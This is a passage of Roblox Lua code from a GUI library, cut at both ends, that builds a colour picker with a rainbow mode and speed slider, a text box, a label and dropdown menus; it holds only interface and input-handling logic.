									Toggle123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle123.BackgroundTransparency = 1.000 
									Toggle123.Size = C.UDIM2(1, 0, 0, 15) 
									Toggle123.Position = C.UDIM2(0, -5, 0, 265) --edit here
									Toggle123.ZIndex = 4
									
									--print('it actually spawned')
									
									Button123.Name = "Button123" 
									Button123.Parent = Toggle123 
									Button123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button123.BackgroundTransparency = 1.000 
									Button123.Size = C.UDIM2(1, 0, 1, 0) 
									Button123.Font = Enum.Font.SourceSans 
									Button123.Text = "" 
									Button123.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button123.TextSize = 11.000
									Button123.ZIndex = 4

									Color123.Name = "Color123" 
									Color123.Parent = Button123
									
									Color123.BackgroundColor3 = getMainColor() 
									
									Color123.BackgroundColor3 = C.COL3RGB(46, 46, 46)
									Color123.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color123.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color123.Size = C.UDIM2(0, 8, 0, 8) 
									Color123.ZIndex = 4

									TextLabel123.Parent = Button123 
									TextLabel123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel123.BackgroundTransparency = 1.000 
									TextLabel123.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel123.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel123.Font = Enum.Font.Gotham 
									TextLabel123.Text = "Rainbow" 
									TextLabel123.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel123.TextSize = 11.000
									TextLabel123.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel123.ZIndex = 4

									local function update123() 
										if Element.value.Rainbow then 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											--keybindremove(text, Element.value.Key) 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										--values[tabname][sectorname][tabtext][text] = Element.value 
									end
									
									Button123.MouseButton1Down:Connect(function() 
										Element.value.Rainbow = not Element.value.Rainbow
										update123() 
									end)
								
											game.RunService.RenderStepped:Connect(function()
												if Element.value.Rainbow then

														ColorH, ColorS, ColorV = tick() % Element.value.RainbowSpeed/Element.value.RainbowSpeed,1,1

														ColorH = C.CLAMP(ColorH,0,1) 
														ColorS = C.CLAMP(ColorS,0,1) 
														ColorV = C.CLAMP(ColorV,0,1)
																							
														ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
														Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

														ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
														Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
														values[tabname][sectorname][text] = Element.value 
														Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
														callback(Element.value)
																							
																							--library.options['armColor']:SetColor(Color3.fromHSV(i,1,1))
														wait()
																				--		library.options['Accent Color']:SetColor(Color3.fromHSV(i,1,1)) -- also u can change any flag that has color by prinitng flags (table.foreach(library.flags,print)

												end
											end)												
								local Slider2113132 = C.INST("Frame") 
								local TextLabel2113132 = C.INST("TextLabel") 
								local Button2113132 = C.INST("TextButton") 
								local Frame123123 = C.INST("Frame") 
								local UIGradient123123 = C.INST("UIGradient") 
								local Value123123123 = C.INST("TextLabel") 

								Slider2113132.Name = "Slider2113132" 
								Slider2113132.Parent = Frame 
								Slider2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider2113132.BackgroundTransparency = 1.000 
								Slider2113132.Position = C.UDIM2(0, -15, 0, 277) --edit here
								Slider2113132.Size = C.UDIM2(1, 0, 0, 25) 
								Slider2113132.ZIndex = 3

								TextLabel2113132.Parent = Slider2113132 
								TextLabel2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel2113132.BackgroundTransparency = 1.000 
								TextLabel2113132.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel2113132.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel2113132.Font = Enum.Font.Gotham 
								TextLabel2113132.Text = "Rainbow speed" 
								TextLabel2113132.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel2113132.TextSize = 11.000
								TextLabel2113132.TextXAlignment = Enum.TextXAlignment.Left 
								TextLabel2113132.ZIndex = 3

								Button2113132.Name = "Button2113132" 
								Button2113132.Parent = Slider2113132 
								Button2113132.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button2113132.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button2113132.Position = C.UDIM2(0, 30, 0, 15) 
								Button2113132.Size = C.UDIM2(0, 175, 0, 5) 
								Button2113132.AutoButtonColor = false 
								Button2113132.Font = Enum.Font.SourceSans 
								Button2113132.Text = "" 
								Button2113132.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button2113132.TextSize = 11.000
								Button2113132.ZIndex = 3

								Frame123123.Parent = Button2113132 
								Frame123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame123123.BorderSizePixel = 0 
								Frame123123.Size = C.UDIM2(0.5, 0, 1, 0) 
								Frame123123.ZIndex = 3
								
								UIGradient123123.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, getMainColor()), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient123123.Rotation = 90
								UIGradient123123.Parent = Frame123123


								Value123123123.Name = "Value123123123" 
								Value123123123.Parent = Slider2113132 
								Value123123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value123123123.BackgroundTransparency = 1.000 
								Value123123123.Position = C.UDIM2(0, 30, 0, 15) 
								Value123123123.Size = C.UDIM2(0, 175, 0, 5)  
								Value123123123.Font = Enum.Font.Gotham 
								Value123123123.Text = "50" 
								Value123123123.TextStrokeTransparency = 0.000
								Value123123123.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value123123123.TextSize = 11.000 
								Value123123123.ZIndex = 4
								local min, max, default = 1, 6, 3
								--Element.Value123123123 = {Slider2113132 = default}
								local a
								if min > 0 then 
									a = ((Element.value.RainbowSpeed - min)) / (max-min) 
								else 
									a = (Element.value.RainbowSpeed-min)/(max-min) 
								end 
								Value123123123.Text = default
								Frame123123.Size = C.UDIM2(a,0,1,0) 
								--values[tabname][sectorname][text] = Element.Value123123123 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button2113132.MouseButton1Down:Connect(function() 
									Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
									val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) or 0 
									Value123123123.Text = val 
									Element.value.RainbowSpeed = val 
									--values[tabname][sectorname][text] = Element.Value123123123 
									--callback(Element.Value123123123) 
									moveconnection = mouse.Move:Connect(function() 
										Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
										val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) 
										Value123123123.Text = val 
										--RainbowSpeed = val 
										--values[tabname][sectorname][text] = Element.Value123123123 
										--callback(Element.Value123123123) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
											val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) 
											--values[tabname][sectorname][text] = Element.Value123123123 
											--callback(Element.Value123123123) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 								
								---------------------------------------------------------------------------------------------------------------------

								Colorpick.Name = "Colorpick" 
								Colorpick.Parent = Frame 
								Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Colorpick.ClipsDescendants = false 
								Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
								Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
								Colorpick.AutoButtonColor = false 
								Colorpick.Image = "rbxassetid://4155801252" 
								Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Colorpick.ZIndex = 3 

								ColorDrag.Name = "ColorDrag" 
								ColorDrag.Parent = Colorpick 
								ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
								ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
								ColorDrag.ZIndex = 3 

								Huepick.Name = "Huepick" 
								Huepick.Parent = Frame 
								Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huepick.ClipsDescendants = true 
								Huepick.Position = C.UDIM2(0, 10, 0, 10) 
								Huepick.Size = C.UDIM2(0, 20, 0, 150) 
								Huepick.AutoButtonColor = false 
								Huepick.Image = "rbxassetid://3641079629" 
								Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Huepick.ImageTransparency = 1 
								Huepick.BackgroundTransparency = 0 
								Huepick.ZIndex = 3 

								local HueFrameGradient = C.INST("UIGradient") 
								HueFrameGradient.Rotation = 90 
								HueFrameGradient.Name = "HueFrameGradient" 
								HueFrameGradient.Parent = Huepick 
								HueFrameGradient.Color = ColorSequence.new { 
									ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
									ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
									ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
									ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
									ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
									ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
									ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
								}	 

								Huedrag.Name = "Huedrag" 
								Huedrag.Parent = Huepick 
								Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
								Huedrag.ZIndex = 3 

								local Transpick = C.INST("ImageButton") 
								local Transcolor = C.INST("ImageLabel") 
								local Transdrag = C.INST("Frame") 

								Transpick.Name = "Transpick" 
								Transpick.Parent = Frame 
								Transpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Transpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Transpick.Position = C.UDIM2(0, 10, 0, 167) 
								Transpick.Size = C.UDIM2(0, 180, 0, 15) 
								Transpick.AutoButtonColor = false 
								Transpick.Image = "rbxassetid://3887014957" 
								Transpick.ScaleType = Enum.ScaleType.Tile 
								Transpick.TileSize = C.UDIM2(0, 10, 0, 10) 
								Transpick.ZIndex = 4 

								Transcolor.Name = "Transcolor" 
								Transcolor.Parent = Transpick 
								Transcolor.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Transcolor.BackgroundTransparency = 1.000 
								Transcolor.Size = C.UDIM2(1, 0, 1, 0) 
								Transcolor.Image = "rbxassetid://3887017050" 
								Transcolor.ImageColor3 = C.COL3RGB(255, 0, 4) 
								Transcolor.ZIndex = 4 

								Transdrag.Name = "Transdrag" 
								Transdrag.Parent = Transcolor 
								Transdrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Transdrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Transdrag.Position = C.UDIM2(0, -1, 0, 0) 
								Transdrag.Size = C.UDIM2(0, 2, 1, 0) 
								Transdrag.ZIndex = 4

								ColorP.MouseButton1Down:Connect(function() 
									Frame.Visible = not Frame.Visible 
								end) 
								local abc = false 
								local inCP = false 
								ColorP.MouseEnter:Connect(function() 
									abc = true 
								end) 
								ColorP.MouseLeave:Connect(function() 
									abc = false 
								end) 
								Frame.MouseEnter:Connect(function() 
									inCP = true 
								end) 
								Frame.MouseLeave:Connect(function() 
									inCP = false 
								end) 

								ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
								ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
								ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

								if data.default and data.default.Color ~= nil then 
									ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								elseif Element.value.Color ~= nil then
									ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								end 
								if data.default and data.default.Transparency ~= nil then 
									Transdrag.Position = C.UDIM2(data.default.Transparency, -1, 0, 0) 
								end 
								local mouse = LocalPlayer:GetMouse() 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if not dragging and not abc and not inCP then 
											Frame.Visible = false 
										end 
									end 
								end) 

								local function updateColor() 
									local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
									ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
									ColorS = 1-ColorX 
									ColorV = 1-ColorY 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								local function updateHue() 
									local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
									Huedrag.Position = C.UDIM2(0, 0, 0, y) 
									hue = y/148 
									ColorH = 1-hue 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								local function updateTrans() 
									local x = C.CLAMP(mouse.X - Transpick.AbsolutePosition.X, 0, 178) 
									Transdrag.Position = C.UDIM2(0, x, 0, 0) 
									Element.value.Transparency = (x/178) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								Transpick.MouseButton1Down:Connect(function() 
									updateTrans() 
									moveconnection = mouse.Move:Connect(function() 
										updateTrans() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateTrans() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								Colorpick.MouseButton1Down:Connect(function() 
									updateColor() 
									moveconnection = mouse.Move:Connect(function() 
										updateColor() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateColor() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								Huepick.MouseButton1Down:Connect(function() 
									updateHue() 
									moveconnection = mouse.Move:Connect(function() 
										updateHue() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateHue() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 

								Button.MouseButton1Down:Connect(function() 
									Element.value.Toggle = not Element.value.Toggle 
									update() 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end) 
								if data.default then 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
								end 
								values[tabname][sectorname][text] = Element.value 
								function Element:SetValue(value) 
									Element.value = value 
									local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
									ColorH, ColorS, ColorV = duplicate:ToHSV() 
									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 

									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									update() 
									update123()
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								end 
								
								elseif type == "TextBox" then 
									Section.Size = Section.Size + C.UDIM2(0,0,0,30) 
									Element.value = {Text = data.default and data.default.text or "",NoLimit = data.default and data.default.NoLimit or false,SetText} 
									NoLimit = data.NoLimit or false
									local Box = C.INST("Frame") 
									local TextBox = C.INST("TextBox") 

									Box.Name = "Box" 
									Box.Parent = Inner 
									Box.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Box.BackgroundTransparency = 1.000 
									Box.Position = C.UDIM2(0, 0, 0.542059898, 0) 
									Box.Size = C.UDIM2(1, 0, 0, 30) 

									TextBox.Parent = Box 
									TextBox.BackgroundColor3 = C.COL3RGB(45, 45, 45) 
									TextBox.BorderColor3 = C.COL3RGB(18, 18, 16)   
									TextBox.Position = C.UDIM2(0.108303241, 0, 0.224465579, 0) 
									TextBox.Size = C.UDIM2(0, 175, 0, 20) 
									TextBox.Font = Enum.Font.Ubuntu
									TextBox.PlaceholderText = data.placeholder 
									TextBox.Text = Element.value.Text 
									TextBox.TextTruncate = 1
									TextBox.ClearTextOnFocus = false
									TextBox.TextStrokeTransparency = 0.000
									TextBox.TextColor3 = C.COL3RGB(255, 255, 255) 
									TextBox.TextSize = 10.000
									function Element.value.SetText(newtext)
										TextBox.Text = newtext
									end
									values[tabname][sectorname][text] = Element.value 

									TextBox:GetPropertyChangedSignal("Text"):Connect(function() 
										if C.LEN(TextBox.Text) > 20 and (NoLimit == false) then 
											TextBox.Text = C.SUB(TextBox.Text, 1, 20) 
										end 
										Element.value.Text = TextBox.Text 
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									function Element:SetValue(value) 
										Element.value = value 
										values[tabname][sectorname][text] = Element.value 
										TextBox.Text = Element.value.Text 
									end 



							elseif type == "Label" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,17) 
								Element.value = {Text = data.default and data.options.text or '', stringchange} 

								local Toggle = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								TextLabel.Parent = Toggle 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 12.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
								Element.value.stringchange = function(text)
								TextLabel.Text = text
								end
								
								values[tabname][sectorname][text] = Element.value

							elseif type == "Dropdown" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Dropdown = data.options[1]} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = Element.value.Dropdown 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.AutomaticCanvasSize = "Y" 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = getMainColor() 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 
								for i,v in ipairs(data.options) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											Drop.Visible = false 
											Element.value.Dropdown = v 
											abcd.Text = v 
											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end) 
										Button.MouseEnter:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  getMainColor()}) 
										end) 
										Button.MouseLeave:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
										end) 

										first = false 
									end 
								end 

								function Element:SetValue(val) 
									Element.value = val 
									abcd.Text = val.Dropdown 
									values[tabname][sectorname][text] = Element.value 
									callback(val) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 
								values[tabname][sectorname][text] = Element.value 
								
								elseif type == "lmao" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Dropdown = data.options[1]} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
